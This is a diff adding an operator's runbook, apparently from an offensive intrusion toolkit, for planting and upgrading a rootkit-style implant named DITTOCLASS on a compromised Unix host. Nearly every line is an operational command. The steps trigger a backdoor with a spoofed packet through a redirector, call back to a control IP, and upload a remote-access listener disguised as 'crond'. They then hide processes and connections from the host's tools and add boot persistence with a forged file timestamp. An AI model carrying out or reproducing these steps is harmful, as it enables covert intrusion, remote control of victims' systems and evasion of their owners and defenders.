@@ -1,0 +1,189 @@
+##### DITTOCLASS #####
+
+### Search/replace commands
+### OLD PKG NAME: if DC prev installed, name of pkg, if not then leave alone
+### OLD DITTOCLASS DIR: if DC prev installed, directory where it was installed
+### NEW PKG NAME: name of new DC installation package
+### NEW DITTOCLASS DIR: directory where DC will be installed
+
+:%s/OLD_PKG_NAME/OLD_PKG_NAME/g
+:%s/OLD_DITTOCLASS_DIR/OLD_DITTOCLASS_DIR/g
+:%s/NEW_PKG_NAME/NEW_PKG_NAME/g
+:%s/NEW_DITTOCLASS_DIR/NEW_DITTOCLASS_DIR/g
+
+
+### Check to see if DITTOCLASS already on target (if fails, not implanted).  
+### Make sure check for other implants too.
+### NOTE: Must use "cat", "-cat" will not work
+### Doing "cat /proc/OLD_PKG_NAME" will register you to see hidden resources
+### If neither of the "cat" commands work and you think there is an old 
+### installation, the "ls" command below should still work, if not there is
+### probably nothing there
+cat /proc/listfiles
+cat /proc/OLD_PKG_NAME
+ls -la /OLD_DITTOCLASS_DIR/OLD_PKG_NAME
+
+
+### If DITTOCLASS already there but needs to be upgraded, go ahead and 
+### uninstall it, if not skip to "Upload the DC package and run..."
+-ls /OLD_DITTOCLASS_DIR/uninstall_OLD_PKG_NAME.sh
+
+# If it exists
+/OLD_DITTOCLASS_DIR/uninstall_OLD_PKG_NAME.sh
+
+
+### After uninstall, in a NOPEN window, grep for the old package name
+### and kill any of the processes associated with it
+netstat -anlp | grep OLD_PKG_NAME
+ps -ef | grep OLD_PKG_NAME
+
+kill -9 OLD_PKG_NAME_PIDS
+
+
+### Make sure old connections/processes gone
+netstat -anlp | grep OLD_PKG_NAME
+ps -ef | grep OLD_PKG_NAME
+
+
+### Make sure unable to connect with hector if connected with hector before 
+# Use whatever command used to get on
+cd /current/bin
+hector .... # your previous hector command line
+
+
+### Upload the DC package and run the install script
+### Removes itself upon installation
+-put /current/up/NEW_PKG_NAME.tar.gz m.tar.gz2
+tar zxvf m.tar.gz
+-lt
+./install.sh
+
+
+### Assuming installation script did not return any errors...
+### Check to see if DC is seemingly working by seeing if the files are
+### in fact being hidden
+-lt /NEW_DITTOCLASS_DIR/    # should NOT see NEW_PKG_NAME in this listing
+-lt /NEW_DITTOCLASS_DIR/NEW_PKG_NAME # SHOULD see NEW_PKG_NAME in this listing 
+
+
+### A little bit more search/replace fun
+### TARGET IP: duh
+### TARGET TRIGGER PORT: duh
+### HECTOR CALLBACK IP: the IP for target to callback to (probably the window
+###                     with the -tunnel)
+### HECTORi CALLBACK PORT: the port for target to callback to
+### RAWSEND PORT: local port to redirect the trigger packet
+### SPOOF SRC IP: source IP of trigger packet
+### BACKDOOR KEY: key to verify whether to call back or not
+###               should be located in:
+###               /current/bin/varkeys/projectname/ip.host/dittoclass
+:%s/TARGET_IP/TARGET_IP/g
+:%s/TARGET_TRIGGER_PORT/TARGET_TRIGGER_PORT/g
+:%s/HECTOR_CALLBACK_IP/HECTOR_CALLBACK_IP/g
+:%s/HECTOR_CALLBACK_PORT/HECTOR_CALLBACK_PORT/g
+:%s/RAWSEND_PORT/RAWSEND_PORT/g
+:%s/SPOOF_SRC_IP/SPOOF_SRC_IP/g
+:%s/BACKDOOR_KEY/BACKDOOR_KEY/g
+
+
+### Setup tunnel on redirector to contact agamemnon with hector
+-tunnel
+u TARGET_TRIGGER_PORT TARGET_IP
+r HECTOR_CALLBACK_PORT
+
+### Setup -rawsend for hector
+-rawsend RAWSEND_PORT
+
+##### Connect to agamemnon from LOCAL WINDOW
+cd /current/bin
+
+### For hector help in case need to play with the trigger line and the
+### -tunnel stuff to get it right
+./hector -v -h
+
+./hector --backdoor --target-ip TARGET_IP --dest-port TARGET_TRIGGER_PORT --spoof-srcip SPOOF_IP --listen-port HECTOR_CALLBACK_PORT --control-ip HECTOR_CALLBACK_IP --udp -Z 127.0.0.1:RAWSEND_PORT --backdoor-trigger BACKDOOR_KEY
+
+### Once connected to target thru hector
+mkdir /tmp/.pci
+cd /tmp/.pci
+
+!help!
+
+### To send a file via hector
+### NOTE: Assume the working dir on target is "/tmp/.dir"
+###       Uploading the filename "crond" will be named "/tmp/.dir/crond" on target
+###       Uploading the filename "/etc/passwd" will be named "/tmp/.dir/_etc_passwd"
+###         on target
+
+### Upload and run a NOPEN listener
+!sendfile!
+cp /current/up/morerats/NOPEN_TO_UPLOAD /current/bin/crond
+crond           # what called noserver in /current/down/HOSTNAME.TARGET_IP
+PATH=. D=-lRANDOM_PORT crond
+
+### From redirector:
+-nstun TARGET_IP:RANDOM_PORT
+
+### Or callbacks (may need to use this for multiple windows instead of -call)
+PATH=. D=-cHECTOR_CALLBACK_IP:RANDOM_PORT crond
+
+-nrtun RANDOM_PORT
+-call HECTOR_CALLBACK_IP:RANDOM_PORT
+
+
+### Register to be allowed to see hidden files/processes/conns
+!register!
+# Enter the new package name at prompt "Please enter the package name:"
+NEW_PKG_NAME
+# must see NEW_PKG_NAME>  REGISTERED to know you are successful
+ 
+
+### Hide processes and ports from hector window
+# In each nopen window:
+-pid
+
+ps -auxww | grep crond
+netstat -an | grep HECTOR_CALLBACK_IP
+
+# Hide process in hector window (to unhide, run !unhideproc!)
+!hideproc!
+Please enter the Process ID you wish to unhide: PID_TO_HIDE
+
+# Confirm in unregistered nopen window that pid is hidden
+ps -auxww | grep PID_TO_HIDE
+
+# Hide connection in hector window (to unhide, run !unhideconn!)
+# NOTE: Always hide the end of the redirector, don't hide the target's
+#       Otherwise, legitimate connections might not show up
+!hideconn!
+Please enter the IP Address you wish to hide:  HECTOR_CALLBACK_IP
+Please enter the port you wish to hide: NOPEN_PORT
+
+# Confirm in unregistered nopen window that conn is hidden
+netstat -an | grep NOPEN_PORT
+
+# make sure processes and connections are hidden
+!listconns!
+!listprocs!
+
+# to exit hector
+<ctrl><d>
+
+
+### Startup script
+### Can modify startup script to add strifeworld or other progs that
+### need to be started on boot
+-lt /etc/rc#.d/S55NEW_PKG_NAME
+-get /etc/rc#.d/S55NEW_PKG_NAME
+
+### After modified...
+-put MODIFIED_SCRIPT s
+
+touch -r /etc/rc#.d/S55NEW_PKG_NAME t
+cat s > /etc/rc#.d/S55NEW_PKG_NAME
+touch -r t /etc/rc#.d/S55NEW_PKG_NAME
+
+-rm s t
+
+####################################################################
+
